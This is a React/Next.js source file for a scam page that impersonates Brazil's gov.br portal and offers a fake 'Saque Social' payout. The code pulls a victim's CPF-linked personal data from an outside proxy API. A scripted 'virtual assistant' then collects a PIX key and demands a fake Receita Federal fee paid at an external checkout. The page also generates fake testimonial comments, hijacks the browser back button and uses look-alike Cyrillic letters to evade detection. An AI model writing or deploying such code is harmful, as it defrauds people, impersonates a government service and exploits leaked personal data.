
"use client";

import React, { useState, useEffect, useRef, Suspense } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import { useRouter, useSearchParams } from 'next/navigation';
// import Plyr from 'plyr-react'; // Original import causing SSR issues
import 'plyr-react/plyr.css';
import type PlyrInstance from 'plyr'; // Import PlyrInstance type
import '../offer-page.css'; // Styles specific to this offer page
import {
  MoreVertical, Cookie, LayoutGrid, User, Menu, Search, CreditCard, CalendarDays, ThumbsUp, ThumbsDown, X, Loader2, VolumeX
} from 'lucide-react';
import dynamic from 'next/dynamic';

const Plyr = dynamic(() => import('plyr-react'), {
  ssr: false,
  // You can add a loading component here if you want:
  // loading: () => <p>Carregando player...</p>
});


interface UserData {
  nome?: string;
  cpf?: string;
  nascimento?: string;
  mae?: string;
}

interface Comment {
  name: string;
  avatar: string;
  text: string;
  likes: number;
  dislikes: number;
  id: string;
}

interface ChatMessage {
  type: 'bot' | 'user' | 'typing';
  text?: string;
  id: string;
}


function OfferContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const initialCpf = searchParams.get('cpf');

  const playerRef = useRef<PlyrInstance | null>(null);
  const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";

  const [loading, setLoading] = useState(true);
  const [showMainContent, setShowMainContent] = useState(false); // To show content after data fetch
  
  // Video and UI states
  const [progress, setProgress] = useState(0);
  const [showThumbnailOverlay, setShowThumbnailOverlay] = useState(true);
  const [showResgateOverlay, setShowResgateOverlay] = useState(false);
  const [videoStarted, setVideoStarted] = useState(false);
  const [videoCompleted, setVideoCompleted] = useState(false);
  const [progressEnabled, setProgressEnabled] = useState(false);
  const [showSaqueButton, setShowSaqueButton] = useState(false);


  const [userData, setUserData] = useState<UserData | null>(null);
  const [headerUserName, setHeaderUserName] = useState('Usuáriо');
  const [statusMessage, setStatusMessage] = useState("Sua indenização está sendo calculada...");


  const [comments, setComments] = useState<Comment[]>([]);
  const [totalComments, setTotalComments] = useState(25738);
  const [loadingCommentsText, setLoadingCommentsText] = useState('');
  
  const [isChatModalOpen, setIsChatModalOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [chatInputValue, setChatInputValue] = useState('');
  const [chaveEnviada, setChaveEnviada] = useState(false);

  const chatBodyRef = useRef<HTMLDivElement>(null);

  // Back button redirect logic
  useEffect(() => {
    const urlBackRedirect = '../back/index.html'; 
    const trimmedUrlBackRedirect = urlBackRedirect.trim() +
      (urlBackRedirect.includes("?") ? '&' : '?') +
      (window.location.search ? window.location.search.replace('?', '') : '');

    history.pushState({}, "", location.href);
    history.pushState({}, "", location.href);

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);
  
  // Restore state from localStorage
  useEffect(() => {
    const storedState = localStorage.getItem('offerPageState');
    if (storedState) {
      try {
        const state = JSON.parse(storedState);
        if (state.chaveEnviada) setChaveEnviada(state.chaveEnviada);
        if (state.chatMessages) setChatMessages(state.chatMessages);
        if (state.videoStarted) setVideoStarted(state.videoStarted);
        if (state.videoCompleted) {
            setVideoCompleted(state.videoCompleted);
            finalizeProgressAppearance(); // Reflect UI changes if video was completed
        }
        if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
        // Thumbnail might not need restoring if videoStarted handles it
        if (state.videoStarted && !state.videoCompleted) {
            setShowThumbnailOverlay(false); // If video started but not completed, hide thumbnail
        }


      } catch (e) {
        console.error("Failed to parse stored state:", e);
        localStorage.removeItem('offerPageState');
      }
    }
  }, []);

  // Store state to localStorage
  useEffect(() => {
    const stateToStore = {
      chaveEnviada,
      chatMessages: chatMessages.filter(msg => msg.type !== 'typing'), 
      videoStarted,
      videoCompleted,
      progressEnabled,
    };
    localStorage.setItem('offerPageState', JSON.stringify(stateToStore));
  }, [chaveEnviada, chatMessages, videoStarted, videoCompleted, progressEnabled]);


  const formatCPF = (cpf: string | undefined) => {
    if (!cpf) return '---';
    const onlyNums = cpf.replace(/\D/g, '');
    if (onlyNums.length !== 11) return cpf;
    return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDateBR = (dateStr: string | undefined) => {
    if (!dateStr) return '---';
    const dateOnly = dateStr.split(' ')[0];
    const [year, month, day] = dateOnly.split('-');
    return `${day}/${month}/${year}`;
  };

  const formatFullName = (name: string | undefined) => {
    if (!name) return '---';
    return name
      .toLowerCase()
      .split(' ')
      .filter(p => p)
      .map(p => p.charAt(0).toUpperCase() + p.slice(1))
      .join(' ');
  };

  useEffect(() => {
    async function fetchAndSetUserData() {
      if (!initialCpf) {
        setLoading(false);
        setShowMainContent(true); 
        console.warn("CPF not found in query params.");
        return;
      }
      
      try {
        const cleanCPF = initialCpf.replace(/\D/g, '');
        const response = await fetch(`https://proxy-a.vercel.app/api/proxy?cpf=${cleanCPF}`);
        if (!response.ok) throw new Error('Failed to fetch user data');
        const data = await response.json();
        
        if (data.dadosBasicos) {
          setUserData(data.dadosBasicos);
          setHeaderUserName(formatFullName(data.dadosBasicos.nome).split(' ')[0] || 'Usuáriо');
        } else {
          throw new Error('User data format incorrect');
        }
      } catch (err) {
        console.error("Error fetching user data:", err);
      } finally {
        setLoading(false);
        setShowMainContent(true);
      }
    }
    
    fetchAndSetUserData();
  }, [initialCpf]);
  
  const handleSaqueButtonClick = () => {
    setIsChatModalOpen(true);
    if (chatMessages.length === 0 && !chaveEnviada) { 
        startBotFlowInitial();
    }
  };

  // Chat Logic
  const scrollChatToBottom = () => {
    if (chatBodyRef.current) {
      chatBodyRef.current.scrollTop = chatBodyRef.current.scrollHeight;
    }
  };

  useEffect(scrollChatToBottom, [chatMessages]);

  const addBotMessage = async (text: string, delayMs = 1000) => {
    setChatMessages(prev => [...prev, { type: 'typing', id: Date.now().toString() + 'typing' }]);
    await new Promise(resolve => setTimeout(resolve, delayMs));
    setChatMessages(prev => prev.filter(msg => msg.type !== 'typing'));
    setChatMessages(prev => [...prev, { type: 'bot', text, id: Date.now().toString() }]);
  };
  
  const addUserMessage = (text: string) => {
    setChatMessages(prev => [...prev, { type: 'user', text, id: Date.now().toString() }]);
  };

  const startBotFlowInitial = async () => {
    await addBotMessage('Olá! Para prosseguir com o seu saque, por favor, informe sua chave PIX.');
  };
  
  const flowAfterPixKey = async () => {
    await addBotMessage('Excelente! Sua <b>chave Pix</b> foi vinculada com sucesso.', 2200);
    await addBotMessage('Observamos que o valor do seu saque supera <b>R$ 5.000</b>, segundo as diretrizes da Receita Federal.', 2500);
    await addBotMessage('Para prosseguir e liberar de forma imediata, é obrigatório o recolhimento de <b>1.3%</b> sobre o valor total.', 2500);
    await addBotMessage('<b>Valor do saque:</b> R$ 5.250,20<br><b>Imposto devido:</b> R$ 68,25<br>Depois do pagamento, o dinheiro cai na hora.', 2500);
    await addBotMessage('Caso o valor do imposto não seja quitado, a Receita Federal destinará o valor do seu Saque Social para projetos e iniciativas de políticos do estado.', 2500);
    await addBotMessage(`<b>Para finalizar o recebimento</b>, clique no botão abaixo:<br/><button class="pay-button" id="dynamic-pay-button">Pagar Imposto Agora</button>`, 0);
  };

  useEffect(() => {
    const payButton = document.getElementById('dynamic-pay-button');
    if (payButton) {
      payButton.onclick = () => {
        const paymentUrl = "https://kingspay.site/checkout/taxa-de-saque-2025"; 
        window.location.href = paymentUrl;
      };
    }
  }, [chatMessages]);


  const handleSendMessage = async () => {
    const text = chatInputValue.trim();
    if (!text) return;

    addUserMessage(text);
    setChatInputValue('');

    if (!chaveEnviada) {
      setChaveEnviada(true);
      await flowAfterPixKey();
    }
  };
  
  // Video Player Logic
  const handleThumbnailClick = () => {
    if (playerRef.current?.plyr) {
      playerRef.current.plyr.muted = false;
      playerRef.current.plyr.play();
      setShowThumbnailOverlay(false);
      setProgressEnabled(true);
      setVideoStarted(true);
    }
  };

  const finalizeProgressAppearance = () => {
      setShowResgateOverlay(true);
      setStatusMessage("Saque liberado.");
      setShowSaqueButton(true);
      setProgress(100);
  }

  const handleVideoEnd = () => {
    if (!videoCompleted) {
        setVideoCompleted(true);
        finalizeProgressAppearance();
    }
  };

  useEffect(() => {
    const plyr = playerRef.current?.plyr;
    if (plyr) {
      const onTimeUpdate = () => {
        if (!progressEnabled || videoCompleted || !plyr.duration) return;
        const percent = (plyr.currentTime / plyr.duration) * 100;
        setProgress(percent);
        if (percent >= 99.9 && !videoCompleted) {
          handleVideoEnd();
        }
      };
      const onPlay = () => {
        if (!videoStarted && !videoCompleted && progressEnabled) {
          setVideoStarted(true);
        } else if (videoCompleted) {
          plyr.pause(); // Prevent replay if already completed
        }
      };
      const onEnded = () => {
        handleVideoEnd();
      };

      plyr.on('timeupdate', onTimeUpdate);
      plyr.on('play', onPlay);
      plyr.on('ended', onEnded);

      // If video was already completed (e.g. from localStorage), show relevant UI
      if (videoCompleted) {
        finalizeProgressAppearance();
        setShowThumbnailOverlay(false);
      } else if (videoStarted) { // If started but not completed
        setShowThumbnailOverlay(false);
        setProgressEnabled(true); // Ensure progress bar updates
      }


      return () => {
        plyr.off('timeupdate', onTimeUpdate);
        plyr.off('play', onPlay);
        plyr.off('ended', onEnded);
      };
    }
  }, [progressEnabled, videoCompleted, videoStarted, playerRef.current]);


  // Fake Facebook Comments Logic
  useEffect(() => {
    const fetchRandomUser = async () => {
      try {
        const res = await fetch('https://randomuser.me/api/?nat=br');
        const data = await res.json();
        return data.results[0];
      } catch (error) {
        console.error("Error fetching random user:", error);
        return { name: { first: "Usuário", last: "Anônimo" }, picture: { medium: "https://placehold.co/40x40.png" } };
      }
    };

    const createNewComment = async (text: string) => {
      const user = await fetchRandomUser();
      const newComment: Comment = {
        id: Date.now().toString(),
        name: formatFullName(user.name.first + " " + user.name.last) || "Usuário Anônimo",
        avatar: user.picture.medium,
        text,
        likes: Math.floor(Math.random() * 100),
        dislikes: Math.floor(Math.random() * 20),
      };
      setComments(prev => [newComment, ...prev.slice(0, 4)]); 
      setTotalComments(prev => prev + 1);
    };
    
    const initialTexts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
    // Only generate initial comments if comments array is empty (e.g. first load)
    if (comments.length === 0) {
        initialTexts.forEach(text => createNewComment(text));
    }


    const commentInterval = setInterval(() => {
      const messages = [
        "Alguém conseguiu R$ 2.700 hoje?",
        "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
        "Testei hoje e entrou R$ 2.100 rapidinho!",
        "Show! Liberou R$ 4.250 e já usei tudo!",
        "Recebi R$ 5.000, só precisei pagar a taxa"
      ];
      createNewComment(messages[Math.floor(Math.random() * messages.length)]);
      setLoadingCommentsText("Comentários atualizados.");
      setTimeout(() => setLoadingCommentsText(""), 2000); 
    }, 10000); 

    return () => clearInterval(commentInterval);
  }, []); // Rerun if comments changes to avoid duplicate initial comments if logic is flawed. Better: check comments.length


  if (loading) {
    return (
      <div id="loading-screen">
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
          <title>GОV.ВR</title>
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
          </text>
        </svg>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>Рrоgrаmа Sаquе Sосiаl - Oferta</title>
         {/* Add any global preloads/dns-prefetch if needed for Plyr or video source if not handled by Plyr itself */}
      </Head>
      <div className="offer-page-body">
        <header className="offer-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45">
              <title>GОV.ВR</title>
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User /> <span id="header-user-name">{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="offer-page-nav">
          <button>
            <Menu />
            <p>Веnеfíсiо <span> &gt; </span> Іndеnizаçãо <span> &gt; </span> Аnálisе</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        {showMainContent && (
          <main id="main-content">
            <div className="progress-container">
              <div className="progress-bar" style={{ width: `${progress}%` }}></div>
            </div>
            <div className="video-container">
               <Plyr
                  ref={playerRef}
                  source={{
                    type: 'video',
                    sources: [{ src: videoUrl, provider: 'html5' }],
                  }}
                  options={{
                    controls: [], // No default controls
                    hideControls: true,
                    clickToPlay: false, // Handled by thumbnail
                    autoplay: false, // Start muted, autoplay handled by thumbnail click
                    muted: true, // Start muted
                    playsinline: true,
                  }}
                />
                {showThumbnailOverlay && (
                  <div className="thumbnail-overlay" onClick={handleThumbnailClick}>
                    <div className="thumbnail-content">
                      <h2>Сliquе<br />раrа оuvir</h2>
                      <VolumeX size={64} color="white" />
                    </div>
                  </div>
                )}
                {showResgateOverlay && (
                  <div className="resgate-overlay">
                    <div className="resgate-content">
                      <h2>Sеu sаquе já еstá disроnívеl раrа rеsgаtе!</h2>
                      <p>Сliquе nо bоtãо аbаiхо раrа еfеtuаr о sаquе.</p>
                    </div>
                  </div>
                )}
            </div>

            <div className="info-container">
              <div className="info-item">
                <CreditCard /> <span id="cpf-value">{formatCPF(userData?.cpf || initialCpf)}</span>
              </div>
              <div className="info-item">
                <User /> <span id="name-value">{formatFullName(userData?.nome)}</span>
              </div>
              <div className="info-item">
                <CalendarDays /> <span id="birth-value">{formatDateBR(userData?.nascimento)}</span>
              </div>
              <div className="info-item">
                <User /> <span id="mother-value">{formatFullName(userData?.mae) || 'Não Informado'}</span>
              </div>
              <div className="info-item" id="status-item">
                <Search /> <span>{statusMessage}</span>
              </div>
            </div>

            {showSaqueButton && (
              <button className="button-saque" onClick={handleSaqueButtonClick} style={{display: 'block'}}>
                Еfеtuаr Sаquе Аgоrа
              </button>
            )}
          </main>
        )}

        {showMainContent && (
          <>
            <div className="fb-header-outside">Comentários ({totalComments})</div>
            <div className="fb-comments-container">
              <div className="fb-header">
                <span className="fb-comment-count">Comentários: {totalComments}</span>
                <span className="fb-loading">
                  {loadingCommentsText ? <><Loader2 className="animate-spin" size={14} /> {loadingCommentsText}</> : "Comentários atualizados."}
                </span>
              </div>
              {comments.map(comment => (
                <div key={comment.id} className="comment-item">
                  <Image className="comment-avatar" src={comment.avatar} alt="avatar" width={40} height={40} data-ai-hint="person avatar"/>
                  <div className="comment-content">
                    <div className="comment-name">{comment.name}</div>
                    <div className="comment-text" dangerouslySetInnerHTML={{ __html: comment.text }}></div>
                    <div className="comment-actions">
                      <span className="comment-likes"><ThumbsUp size={12} /> {comment.likes}</span>
                      <span className="comment-dislikes"><ThumbsDown size={12} /> {comment.dislikes}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </>
        )}

        <footer className="offer-page-footer">Теrmоs dе Usо dе Аvisо dе Рrivасidаdе</footer>

        {isChatModalOpen && (
          <div id="modal-chat" className="active">
            <div className="chat-bot-container">
              <div className="chat-header">
                <span className="chat-header-title">Аtеndimеntо Virtuаl</span>
                <button className="close-btn" onClick={() => setIsChatModalOpen(false)}><X /></button>
              </div>
              <div className="chat-body" ref={chatBodyRef}>
                {chatMessages.map(msg => {
                  if (msg.type === 'typing') {
                    return (
                      <div key={msg.id} className="typing-indicator-container message-bot-container">
                        <Image className="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot" width={24} height={24} data-ai-hint="government logo"/>
                        <div className="message-bot typing-indicator-bubble">
                          <div className="blue-circle"></div><div className="blue-circle"></div><div className="blue-circle"></div>
                        </div>
                      </div>
                    );
                  }
                  return msg.type === 'bot' ? (
                    <div key={msg.id} className="message-bot-container">
                       <Image className="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot" width={24} height={24} data-ai-hint="government logo"/>
                      <div className="message-bot" dangerouslySetInnerHTML={{ __html: msg.text || ''}}></div>
                    </div>
                  ) : (
                    <div key={msg.id} className="message-user-container">
                      <div className="message-user">{msg.text}</div>
                    </div>
                  );
                })}
              </div>
              <div className="chat-footer">
                <input 
                  type="text" 
                  id="user-input" 
                  placeholder="Digite sua chave pix..." 
                  value={chatInputValue}
                  onChange={(e) => setChatInputValue(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleSendMessage()}
                />
                <button id="send-message" onClick={handleSendMessage}>Еnviаr</button>
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}


export default function OfferPage() {
  return (
    <Suspense fallback={<div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> <title>GОV.ВR</title> <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> </text> </svg> </div>}>
      <OfferContent />
    </Suspense>
  );
}

